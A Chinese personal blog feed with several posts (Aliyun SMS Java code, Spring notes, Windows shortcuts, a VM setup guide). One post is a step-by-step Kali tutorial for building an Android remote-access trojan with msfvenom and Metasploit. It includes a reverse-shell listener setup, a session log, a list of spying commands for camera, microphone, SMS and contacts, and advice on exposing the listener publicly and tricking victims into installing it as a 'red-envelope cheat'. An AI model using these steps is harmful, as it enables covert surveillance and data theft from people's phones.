com.aliyuncs.profile.IClientProfile;import com.google.gson.Gson;import org.springframework.expression.common.TemplateParserContext;public class PhoneCode {    private static String code ;//    public static void main(String[] args) {//        String phone = &quot;16655072520&quot;; //此处可输入你的手机号码进行测试//        System.out.println(vcode());//        getPhonemsg(phone);//////    }    /**     * 阿里云短信服务配置     * @param mobile     * @return     */    public static String getPhonemsg(String mobile) {        /**         * 进行正则关系校验         */        System.out.println(mobile);        if (mobile == null || mobile == &quot;&quot;) {            System.out.println(&quot;手机号为空&quot;);            return &quot;&quot;;        }        /**         * 短信验证---阿里大于工具         */        // 设置超时时间-可自行调整        System.setProperty(StaticPeram.defaultConnectTimeout, StaticPeram.Timeout);        System.setProperty(StaticPeram.defaultReadTimeout, StaticPeram.Timeout);        // 初始化ascClient需要的几个参数        final String product = StaticPeram.product;// 短信API产品名称（短信产品名固定，无需修改）        final String domain = StaticPeram.domain;// 短信API产品域名（接口地址固定，无需修改）        // 替换成你的AK        final String accessKeyId = StaticPeram.accessKeyId;// 你的accessKeyId,参考本文档步骤2        final String accessKeySecret = StaticPeram.accessKeySecret;// 你的accessKeySecret，参考本文档步骤2        // 初始化ascClient,暂时不支持多region        IClientProfile profile = DefaultProfile.getProfile(&quot;cn-hangzhou&quot;,                accessKeyId, accessKeySecret);        try {            DefaultProfile.addEndpoint(&quot;cn-hangzhou&quot;, &quot;cn-hangzhou&quot;, product,                    domain);        } catch (ClientException e1) {            e1.printStackTrace();        }        //获取验证码        code = vcode();        IAcsClient acsClient = new DefaultAcsClient(profile);        // 组装请求对象        SendSmsRequest request = new SendSmsRequest();        // 使用post提交        request.setMethod(MethodType.POST);        // 必填:待发送手机号。支持以逗号分隔的形式进行批量调用，批量上限为1000个手机号码,批量调用相对于单条调用及时性稍有延迟,验证码类型的短信推荐使用单条调用的方式        request.setPhoneNumbers(mobile);        // 必填:短信签名-可在短信控制台中找到        request.setSignName(StaticPeram.SignName);        // 必填:短信模板-可在短信控制台中找到        request.setTemplateCode(StaticPeram.TemplateCode);        // 可选:模板中的变量替换JSON串,如模板内容为&quot;亲爱的${name},您的验证码为${code}&quot;时,此处的值为        // 友情提示:如果JSON中需要带换行符,请参照标准的JSON协议对换行符的要求,比如短信内容中包含\r\n的情况在JSON中需要表示成\\r\\n,否则会导致JSON在服务端解析失败        request.setTemplateParam(&quot;{ \&quot;code\&quot;:\&quot;&quot;+code+&quot;\&quot;}&quot;);        // 可选-上行短信扩展码(无特殊需求用户请忽略此字段)        // request.setSmsUpExtendCode(&quot;90997&quot;);        // 可选:outId为提供给业务方扩展字段,最终在短信回执消息中将此值带回给调用者        request.setOutId(&quot;yourOutId&quot;);        // 请求失败这里会抛ClientException异常        SendSmsResponse sendSmsResponse;        try {            sendSmsResponse = acsClient.getAcsResponse(request);            if (sendSmsResponse.getCode() != null                    &amp;&amp; sendSmsResponse.getCode().equals(&quot;OK&quot;)) {                // 请求成功                System.out.println(&quot;获取验证码成功！！！&quot;);            } else {                //如果验证码出错，会输出错误码告诉你具体原因                System.out.println(sendSmsResponse.getCode());                System.out.println(&quot;获取验证码失败...&quot;);            }        } catch (ServerException e) {            e.printStackTrace();            return &quot;由于系统维护，暂时无法注册！！！&quot;;        } catch (ClientException e) {            e.printStackTrace();            return &quot;由于系统维护，暂时无法注册！！！&quot;;        }        return &quot;true&quot;;    }    /**     * 生成6位随机数验证码     * @return     */    public static String vcode(){        String vcode = &quot;&quot;;        for (int i = 0; i &lt; 6; i++) {            vcode = vcode + (int)(Math.random() * 9);        }//        Gson gson = new Gson();//        String code = gson.toJson(vcode);        return vcode;    }}</code></pre><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>${“此处值应与模板中一致，比如模板中为code,此处即为code”,code}；<br>遇到API错误码可参考<br><a href="https://help.aliyun.com/document_detail/101346.html?spm=a2c4g.11186623.4.4.2e036edfKqCLZR" target="_blank" rel="noopener">官方文档解决方法</a></p>]]></content>
      
      
      <categories>
          
          <category> 短信服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API </tag>
            
            <tag> 短信服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali生成安卓木马</title>
      <link href="/2019/12/29/attark/as/"/>
      <url>/2019/12/29/attark/as/</url>
      
        <content type="html"><![CDATA[<h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><p>需要有kali系统并且保证相关命令正常执行。<br>登录Oracle官网下载Linux版的jdk<br>事出有因，期末了各科都要交项目，安卓也不例外，我想着交什么呢？交安卓app感觉太过乏味，还是这个比较新颖，显得Big高。</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>1.打开终端，输入ifconfig查看ip地址(也是监听地址)<br>2.输入以下命令</p><pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=你kali的ip LPORT=5555 R &gt; /root/apk.apk</code></pre><p>3.为了木马的兼容性为其配置签名，并验证  </p><pre><code>创建证书:keytool -genkey -V -keystore apk-trojan-key.keystore -alias apk -keyalg RSA -keysize 1024 -validity 999  注意:这里alias参数后跟apk文件夹的文件名，文件名参考第二部生成，可自行设置。  签名:jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk-trojan-key.keystore apk.apk apk 验证:jarsigner -verify -verbose apk.apk</code></pre><p>4.使用Zipalign优化apk</p><pre><code>安装命令:apt-get install zipalign优化apk:zipalign -v 4 apk.apk aaaa.apk</code></pre><p>5.启动攻击加载模块，设置反弹连接</p><pre><code>启动msf:msfconsole1.use exploit/multi/handler //加载模块2. set payload android/meterpreter/reverse_tcp //选择Payload3.show options //查看参数设置这个payload里边有两个参数要设置 LHOST和LPORT 表示地址和端口 默认的端口是4444 现在我们来更改设置1.set LHOST 172.23.0.209 //这里的地址设置成我们刚才生成木马的IP地址2.set LPORT 5555 //这里的端口设置成刚才我们生成木马所监听的端口3.exploit //开始执行漏洞 开始监听,等待手机上线</code></pre><h4 id="结果流程演示"><a href="#结果流程演示" class="headerlink" title="结果流程演示"></a>结果流程演示</h4><pre><code>root@kali:~# ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 10.210.26.27  netmask 255.255.248.0  broadcast 10.210.31.255        inet6 fe80::20c:29ff:fe4f:7237  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:0c:29:4f:72:37  txqueuelen 1000  (Ethernet)        RX packets 16  bytes 2062 (2.0 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 37  bytes 3277 (3.2 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 20  bytes 1116 (1.0 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 20  bytes 1116 (1.0 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0root@kali:~# msfvenom -p android/meterpreter/reverse_tcp LHOST=10.210.26.27 LPORT=5555 R &gt; /root/apk.apk[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload[-] No arch selected, selecting arch: dalvik from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 10085 bytesroot@kali:~# keytool -genkey -V -keystore apk-trojan-key.keystore -alias apk -keyalg RSA -keysize 1024 -validity 999输入密钥库口令:  再次输入新口令: 您的名字与姓氏是什么?  [Unknown]:  1您的组织单位名称是什么?  [Unknown]:  1您的组织名称是什么?  [Unknown]:  1您所在的城市或区域名称是什么?  [Unknown]:  1您所在的省/市/自治区名称是什么?  [Unknown]:  1该单位的双字母国家/地区代码是什么?  [Unknown]:  1CN=1, OU=1, O=1, L=1, ST=1, C=1是否正确?  [否]:  y正在为以下对象生成 1,024 位RSA密钥对和自签名证书 (SHA256withRSA) (有效期为 999 天):     CN=1, OU=1, O=1, L=1, ST=1, C=1输入 &lt;apk&gt; 的密钥口令    (如果和密钥库口令相同, 按回车):  [正在存储apk-trojan-key.keystore]Warning:JKS 密钥库使用专用格式。建议使用 &quot;keytool -importkeystore -srckeystore apk-trojan-key.keystore -destkeystore apk-trojan-key.keystore -deststoretype pkcs12&quot; 迁移到行业标准格式 PKCS12。root@kali:~# jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA1 -keystore apk-trojan-key.keystore apk.apk apk输入密钥库的密码短语:    正在添加: META-INF/APK.SF   正在添加: META-INF/APK.RSA  正在签名: AndroidManifest.xml  正在签名: resources.arsc  正在签名: classes.dex&gt;&gt;&gt; 签名者    X.509, CN=1, OU=1, O=1, L=1, ST=1, C=1    [可信证书]jar 已签名。警告: 签名者证书为自签名证书。root@kali:~# jarsigner -verify -verbose apk.apks        258 Sat Dec 28 10:47:08 EST 2019 META-INF/MANIFEST.MF         393 Sat Dec 28 10:49:06 EST 2019 META-INF/APK.SF         870 Sat Dec 28 10:49:06 EST 2019 META-INF/APK.RSA         272 Sat Dec 28 10:47:08 EST 2019 META-INF/SIGNFILE.SF        1842 Sat Dec 28 10:47:08 EST 2019 META-INF/SIGNFILE.RSA           0 Sat Dec 28 10:47:08 EST 2019 META-INF/sm      6992 Sat Dec 28 10:47:08 EST 2019 AndroidManifest.xmlsm       572 Sat Dec 28 10:47:08 EST 2019 resources.arscsm     19932 Sat Dec 28 10:47:08 EST 2019 classes.dex  s = 已验证签名   m = 在清单中列出条目  k = 在密钥库中至少找到了一个证书  i = 在身份作用域内至少找到了一个证书- 由 &quot;CN=1, OU=1, O=1, L=1, ST=1, C=1&quot; 签名    摘要算法: SHA1    签名算法: SHA256withRSA, 1024 位密钥- 无法解析的与签名相关的文件 META-INF/SIGNFILE.SFjar 已验证。警告: 此 jar 包含其证书链无效的条目。原因: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target此 jar 包含其签名者证书为自签名证书的条目。此 jar 包含的签名没有时间戳。如果没有时间戳, 则在其中任一签名者证书到期 (最早为 2022-09-22) 之后, 用户可能无法验证此 jar。有关详细信息, 请使用 -verbose 和 -certs 选项重新运行。签名者证书将于 2022-09-22 到期。root@kali:~# zipalign -v 4 apk.apk aaaa.apkVerifying alignment of aaaa.apk (4)...      50 META-INF/MANIFEST.MF (OK - compressed)     283 META-INF/APK.SF (OK - compressed)     626 META-INF/APK.RSA (OK - compressed)    1316 META-INF/ (OK)    1366 META-INF/SIGNFILE.SF (OK - compressed)    1648 META-INF/SIGNFILE.RSA (OK - compressed)    2733 AndroidManifest.xml (OK - compressed)    4500 resources.arsc (OK - compressed)    4730 classes.dex (OK - compressed)Verification successfulroot@kali:~# msfconsole[-] ***rting the Metasploit Framework console...-[-] * WARNING: No database support: could not connect to server: Connection refused    Is the server running on host &quot;localhost&quot; (::1) and accepting    TCP/IP connections on port 5432?could not connect to server: Connection refused    Is the server running on host &quot;localhost&quot; (127.0.0.1) and accepting    TCP/IP connections on port 5432?[-] ***      .:okOOOkdc&#39;           &#39;cdkOOOko:.    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:  &#39;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#39;  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx  lOOOOOOOO.         ;d;         ,OOOOOOOOl  .OOOOOOOO.   .;           ;    ,OOOOOOOO.   cOOOOOOO.   .OOc.     &#39;oOO.   ,OOOOOOOc    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl      ;OOOO&#39;   .OOOO.   :OOOO.   ;OOOO;       .dOOo   .OOOOocccxOOOO.   xOOd.         ,kOl  .OOOOOOOOOOOOO. .dOk,           :kk;.OOOOOOOOOOOOO.cOk:             ;kOOOOOOOOOOOOOOOk:               ,xOOOOOOOOOOOx,                 .lOOOOOOOl.                    ,dOd,                      .       =[ metasploit v5.0.41-dev                          ]    + -- --=[ 1914 exploits - 1074 auxiliary - 330 post       ]    + -- --=[ 556 payloads - 45 encoders - 10 nops            ]    + -- --=[ 4 evasion                                       ]msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload android/meterpreter/reverse_tcppayload =&gt; android/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; show optionsModule options (exploit/multi/handler):   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options (android/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST                   yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Wildcard Targetmsf5 exploit(multi/handler) &gt; set LHOST 10.210.26.27LHOST =&gt; 10.210.26.27msf5 exploit(multi/handler) &gt; set LPORT 5555LPORT =&gt; 5555msf5 exploit(multi/handler) &gt; exploit[*] Started reverse TCP handler on 10.210.26.27:5555 [*] Sending stage (72435 bytes) to 10.210.26.14[*] Meterpreter session 1 opened (10.210.26.27:5555 -&gt; 10.210.26.14:53964) at 2019-12-28 10:55:04 -0500meterpreter &gt; sysinfoComputer    : localhostOS          : Android 8.1.0 - Linux 4.19.50-android-x86_64-geeb7e76e5df5 (x86_64)Meterpreter : dalvik/androidmeterpreter &gt; 到此完成木马生成及植入</code></pre><h3 id="木马常用监听命令"><a href="#木马常用监听命令" class="headerlink" title="木马常用监听命令"></a>木马常用监听命令</h3><pre><code>     webcam_list  列出网络摄像头    webcam_stream //开启摄像头    webcam_snap //隐秘拍照功能    record_mic [ˈrekərd]/记录/  从默认麦克风录制音频为X秒    webcam_chat  开始视频聊天    webcam_snap  从指定的摄像头获取快照    webcam_stream -i 1  从指定的网络摄像头播放视频流[选择后摄像头]    Android Commands    =================    activity_start  从URI字符串启动Android活动    check_root  检查设备是否有根    dump_calllog  获取调用日志    dump_contacts  获取联系人列表    dump_sms  获取短信    geolocate  利用地理定位获取当前LAT    wlan_geolocate  利用WLAN信息获取当前LAT    hide_app_icon  从发射器隐藏应用程序图标    interval_collect  管理区间收集能力    send_sms  从目标会话发送短消息    set_audio_mode    sqlite_query  从存储库查询SQLite数据库    wakelock  启用/禁用Wakelock    可以输入?查看更多命令</code></pre><h3 id="常见问题解决"><a href="#常见问题解决" class="headerlink" title="常见问题解决"></a>常见问题解决</h3><h4 id="jarsigner命令找不到"><a href="#jarsigner命令找不到" class="headerlink" title="jarsigner命令找不到"></a>jarsigner命令找不到</h4><p>原因:没有安装Java jdk，命令基于Java jdk执行，解决需要给kali配置Java jdk环境。<br><a href="https://www.gworg.com/problems/901.html" target="_blank" rel="noopener">jarsigner签名使用</a><br><a href="https://blog.csdn.net/weixin_41732074/article/details/84679138" target="_blank" rel="noopener">推荐jdk安装文档</a></p><h4 id="Zipalign无法下载"><a href="#Zipalign无法下载" class="headerlink" title="Zipalign无法下载"></a>Zipalign无法下载</h4><p><img src="http://img.ahdy.top/QQ%E5%9B%BE%E7%89%8720191228215934.png" alt><br>可能跟你当前的网络环境有关系，换数据试一下，如果行不通参考以下<br><a href="https://www.fujieace.com/kali-linux/update-source.html" target="_blank" rel="noopener">kali源更新</a><br>参考其中的更新命令，更新源之后再尝试是否能下载成功插件。</p><h4 id="木马生成后监视窗口无响应"><a href="#木马生成后监视窗口无响应" class="headerlink" title="木马生成后监视窗口无响应"></a>木马生成后监视窗口无响应</h4><p>显示Started reverse TCP handler on “IP：端口”<br>但是不管怎么点击手机上的app msf里都没反应呢？</p><p>答:<br>服务器这边没反应是没建立起连接。先ping一下查看电脑能否ping通手机，如果可以那可能是端口问题，telnet一下就知道了，有可能端口被防火墙屏蔽了，有可能是端口被其他服务占用了。当然也不排除手机的问题，比如一些安全软件之类的问题，最好在虚拟机内测试避免木马造成不可逆的破坏。</p><h3 id="让安装的人都中招"><a href="#让安装的人都中招" class="headerlink" title="让安装的人都中招"></a>让安装的人都中招</h3><p>1.内网穿透，让你的监控地址成为一个公网IP这样就能接收到广域网的传来信息。</p><p>2.木马涉及的敏感权限较多，需要加壳，最近在研究apk反编译等技术，希望能修改掉apk图标，名称等。  </p><p>3.如何让别人心甘情愿的自己安装，不仅要看木马的伪装，也要看你如何去社工，其实社工的本质就是研究对方的心理，达到欺骗目的，比如你可以说，这是一个抢红包外挂，是不是对方极大程度的对软件的安全性放松警惕呢？</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>文章内容仅供学习参考,不得用于非法测试,请遵守国家法律!</p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware安装安卓虚拟机</title>
      <link href="/2019/12/28/as/asvmware/"/>
      <url>/2019/12/28/as/asvmware/</url>
      
        <content type="html"><![CDATA[<h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><p><a href="https://www.osboxes.org/android-x86/#android-x86-8-vmware" target="_blank" rel="noopener">安卓虚拟机镜像直达</a><br>可能会比较卡…<br><a href="https://blog.csdn.net/qq_44402990/article/details/98480842" target="_blank" rel="noopener">参考文档</a></p><h3 id="踩坑问题解决"><a href="#踩坑问题解决" class="headerlink" title="踩坑问题解决"></a>踩坑问题解决</h3><p>如果你幸运的一次性安装好了虚拟机那么就不要看下面这些，如果，如果你是不幸的。<br>在安装好了虚拟机之后<br><img src="http://img.ahdy.top/2019-12-28_223306.png" alt="效果图"><br>你玩了一会儿就会发现，它不让下载应用，关于这种问题的解决可以参考<br><a href="https://blog.csdn.net/weixin_43913500/article/details/88760557" target="_blank" rel="noopener">解决文档</a><br><img src="http://img.ahdy.top/2019-12-28_224449.png" alt="手动敲进命令"><br>使用wget下载安装(可能因为谷歌系统时间问题导致应用数据请求不到，按照提示修改时间差)，之后，就能安装别的应用了。<br><img src="http://img.ahdy.top/2019-12-28_230855.png" alt></p><h4 id="无法上网"><a href="#无法上网" class="headerlink" title="无法上网"></a>无法上网</h4><p>首先检查VMware虚拟机服务是否被禁用，如果你的电脑上有360，那么这一步更加重要。<br>按下Ctrl+Shift+Esc，打开任务管理器，点服务<br><img src="http://img.ahdy.top/2019-12-28_233303.png" alt="全开启"><br>重启模拟器打开WiFi一般情况即可恢复上网</p><pre><code>虚拟机中的安卓是从谷歌上下的，那应该有终端模拟器,不过VM虚拟机要联网的前提是用以太网才行，无线网无法虚拟的进入终端模拟器，首先输入 ip a 回车，看一下出来的选项里面有没有eth0，如果没有的话，那就是缺失驱动如果有eth0那就好办了，输入su 回车使终端模拟器获得root权限然后输入dhcpcd eth0 使以太网自动取得IP最后一步，设定 DNS Server，输入setprop net.dns1 8.8.8.8即可上网</code></pre>]]></content>
      
      
      <categories>
          
          <category> VMware </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> VMware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MVC 接口</title>
      <link href="/2019/12/28/ssm/spinterface/"/>
      <url>/2019/12/28/ssm/spinterface/</url>
      
        <content type="html"><![CDATA[<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><pre><code>Spring4.3中引进了｛@GetMapping、@PostMapping、@PutMapping、@DeleteMapping、@PatchMapping｝  来帮助简化常用的HTTP方法的映射，并更好地表达被注解方法的语义。 @RequestMapping如果没有指定请求方式，将接收Get,Post,Head,Options等所有的请求方式@GetMapping是一个组合注解，是@RequestMapping(method = RequestMethod.GET)的缩写。@PostMapping是一个组合注解，是@RequestMapping(method = RequestMethod.POST)的缩写。</code></pre><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>该地址类似原来servlet的地址，web前端访问地址时会自动执行注解下的方法。</p><pre><code>@Controllerpublic class HelloWorldController {    //只接受get方式的请求    @GetMapping(&quot;/testGetMapping&quot;)    public String testGetMapping(Model model) {        model.addAttribute(&quot;msg&quot;,&quot;测试@GetMapping注解&quot;);        return &quot;success&quot;;    }    //只接受post方式的请求    @PostMapping(&quot;/testPostMapping&quot;)    public String testPostMapping(Model model) {        model.addAttribute(&quot;msg&quot;,&quot;测试@PostMapping注解&quot;);        return &quot;success&quot;;    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> 注解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA报错</title>
      <link href="/2019/12/24/framework/ideaerror01/"/>
      <url>/2019/12/24/framework/ideaerror01/</url>
      
        <content type="html"><![CDATA[<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="非法字符-“-ufeff”-Error-1-10-java-需要class-interface或enum-Idea导入Eclipse项目报错"><a href="#非法字符-“-ufeff”-Error-1-10-java-需要class-interface或enum-Idea导入Eclipse项目报错" class="headerlink" title="非法字符: “\ ufeff” Error:(1, 10) java: 需要class, interface或enum Idea导入Eclipse项目报错"></a>非法字符: “\ ufeff” Error:(1, 10) java: 需要class, interface或enum Idea导入Eclipse项目报错</h4><p><a href="https://blog.csdn.net/qq_19677511/article/details/92074288" target="_blank" rel="noopener">参考CSDN</a><br>亲测有效！</p>]]></content>
      
      
      <categories>
          
          <category> IDEA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>枪版电影网</title>
      <link href="/2019/12/22/framework/movies/"/>
      <url>/2019/12/22/framework/movies/</url>
      
        <content type="html"><![CDATA[<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://www.jianshu.com/p/d51bd21b33dd" target="_blank" rel="noopener">简书</a></p>]]></content>
      
      
      <categories>
          
          <category> 电影 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电影 </tag>
            
            <tag> movies </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows10快捷键</title>
      <link href="/2019/12/22/framework/windows/"/>
      <url>/2019/12/22/framework/windows/</url>
      
        <content type="html"><![CDATA[<h3 id="常用且高效的快捷键"><a href="#常用且高效的快捷键" class="headerlink" title="常用且高效的快捷键"></a>常用且高效的快捷键</h3><pre><code>1.【Windows徽标键】+【Ctrl】+【D】可以新建一个桌面同时按下【Windows徽标键】+【Ctrl】键加上【左右方向键】，就可以切换不用的桌面2.按【Alt】+【Tab】组合键可以切换桌面，但默认是【仅限我正在使用的桌面】  进入【设置】-【多任务】选项中可以将其修改为【所有桌面】，就可以在虚拟桌面间进行切换。</code></pre><p><img src="http://img.ahdy.top/2019-12-22_030134.png" alt></p><pre><code>3.win+E打开我的电脑4.win+i打开设置5.win+L锁屏6.win+shift+s截屏7.win+D返回电脑桌面8.win+A通知栏9.win+s搜索栏10.win+；emoj表情11.win+v 剪切板，图文识别12.笔记本触摸板切屏细心的朋友会发现，在Win10任务栏右下角最边缘的地方   有一个小竖条，点击这个小竖条，就可以快速切换到桌面</code></pre><p><img src="http://img.ahdy.top/2019-12-22_030825.png" alt></p><pre><code>只需要将鼠标藏在竖条处，轻触触摸板即可实现神不知鬼不觉的切屏。</code></pre>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 快捷键 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP的归隐</title>
      <link href="/2019/12/21/draiy/lossjsp/"/>
      <url>/2019/12/21/draiy/lossjsp/</url>
      
        <content type="html"><![CDATA[<h3 id="关于JSP的淘汰问题（转）"><a href="#关于JSP的淘汰问题（转）" class="headerlink" title="关于JSP的淘汰问题（转）"></a>关于JSP的淘汰问题（转）</h3><p>来源：<a href="https://www.cnblogs.com/BobHuang/p/11220251.html" target="_blank" rel="noopener">https://www.cnblogs.com/BobHuang/p/11220251.html</a></p><p>大中型公司需要专业人才，小公司需要全才，但是对于个人职业发展来说，我建议是分开。你要是这辈子就吃java这碗饭，就不要去研究什么css，js等等。</p><p>把你的精力专注在java，jvm原理，spring原理，mysql锁，事务，多线程，大并发，分布式架构，微服务，以及相关的项目管理等等，这样你的核心竞争力才会越来越高，正所谓你往生活中投入什么，生活就会反馈给你什么。</p><p>几曾何时，我们的java web项目都是使用了若干后台框架，springmvc/struts + spring + spring jdbc/hibernate/mybatis 等等</p><p>大多数项目在java后端都是分了三层，控制层（controller/action），业务层（service/manage），持久层（dao）。</p><p>控制层负责接收参数，调用相关业务层，封装数据，以及路由到jsp页面。然后jsp页面上使用各种标签（jstl/el）或者手写java（&lt;%=%&gt;）将后台的数据展现出来</p><p>你需要用maven或者eclipse等工具把你的代码打成一个war包，然后把这个war包发布到你的生产环境下的web容器（tomcat/jboss/weblogic/websphere/jetty/resin）里，对吧？</p><p>发布完了之后，你要启动你的web容器，开始提供服务，这时候你通过配置域名，dns等等相关，你的网站就可以访问了（假设你是个网站）。 </p><p>那我们来看，你的前后端代码是不是全都在那个war包里？包括你的js，css，图片，各种第三方的库，对吧？</p><p>浏览器中输入你的网站域名（<a href="http://www.xxx.com），之后发生了什么？" target="_blank" rel="noopener">www.xxx.com），之后发生了什么？</a></p><p>浏览器在通过ip路由到你的服务，在tcp3次握手之后，通过tcp协议开始访问你的web服务器，你的web服务器得到请求后，开始提供服务，接收请求，之后通过response返回你的应答给浏览器。 </p><p>那么我们来看，我们先假设你的首页中有100张图片，以及一个单表的查询，此时，用户的看似一次http请求，其实并不是一次，用户在第一次访问的时候，浏览器中不会有缓存，你的100张图片，浏览器要连着请求100次http请求（有人会跟我说http长链短链的问题，不在这里讨论），你的web服务器接收这些请求，都需要耗费内存去创建socket来玩tcp传输。 </p><p>重点来了，这样的话，你的web服务器的压力会非常大，因为页面中的所有请求都是只请求到你这台服务器上，如果1个人还好，如果10000个人并发访问呢（先不聊web服务器集群，这里就说是单实例web服务器），那你的服务器能扛住多少个tcp链接？你的服务器的内存有多大？你能抗住多少IO？你给web服务器分的内存有多大？会不会宕机？</p><p>这就是为什么，越是大中型的web应用，他们越是要解耦。</p><p>理论上你可以把你的数据库+应用服务+消息队列+缓存+用户上传的文件+日志+等等都扔在一台主机上，但是这样就好像是你把鸡蛋都放在一个篮子里，隐患非常大。</p><p>正常的分布式架构，是都要拆开的，你的应用服务器集群（前，后）+文件服务器集群+数据库服务器集群+消息队列集群+缓存集群等等。</p><h3 id="使用jsp的痛点："><a href="#使用jsp的痛点：" class="headerlink" title="使用jsp的痛点："></a>使用jsp的痛点：</h3><p>1.<br>动态资源和静态资源全部耦合在一起，无法做到真正的动静分离。服务器压力大，因为服务器会收到各种http请求，例如css的http请求，js的，图片的，动态代码的等等。一旦服务器出现状况，前后台一起玩完，用户体验极差。  </p><p>2.<br>前端工程师做好html后，需要由java工程师来将html修改成jsp页面，出错率较高（因为页面中经常会出现大量的js代码），修改问题时需要双方协同开发，效率低下。</p><p>3.<br>jsp必须要在支持java的web服务器里运行（例如tomcat等），无法使用nginx等（nginx据说单实例http并发高达5w，这个优势要用上），性能提不上来。</p><p>4.<br>第一次请求jsp，必须要在web服务器中编译成servlet，第一次运行会较慢。</p><p>5.<br>每次请求jsp都是访问servlet再用输出流输出的html页面，效率没有直接使用html高。</p><p>6.<br>jsp内有较多标签和表达式，前端工程师在修改页面时会捉襟见肘，遇到很多痛点。</p><p>7.<br>如果jsp中的内容很多，页面响应会很慢，因为是同步加载。</p><p>基于上述的一些痛点，我们应该把整个项目的开发权重往前移，实现前后端真正的解耦！</p><h4 id="以前老的方式是："><a href="#以前老的方式是：" class="headerlink" title="以前老的方式是："></a>以前老的方式是：</h4><p>1.<br>客户端请求</p><p>2.<br>服务端的servlet或controller接收请求（路由规则由后端制定，整个项目开发的权重大部分在后端）</p><p>3.<br>调用service,dao代码完成业务逻辑</p><p>4.<br>返回jsp</p><p>5.<br>jsp展现一些动态的代码</p><h4 id="新的方式是："><a href="#新的方式是：" class="headerlink" title="新的方式是："></a>新的方式是：</h4><p>1.<br>浏览器发送请求</p><p>2.<br>直接到达html页面（路由规则由前端制定，整个项目开发的权重前移）</p><p>3.<br>html页面负责调用服务端接口产生数据（通过ajax等等）</p><p>4.<br>填充html，展现动态效果。</p><p>（有兴趣的童鞋可以访问一下阿里巴巴等大型网站，然后按一下F12，监控一下你刷新一次页面，他的http是怎么玩的，大多数都是单独请求后台数据，使用json传输数据，而不是一个大而全的http请求把整个页面包括动+静全部返回过来）</p><h4 id="这样做的好处是："><a href="#这样做的好处是：" class="headerlink" 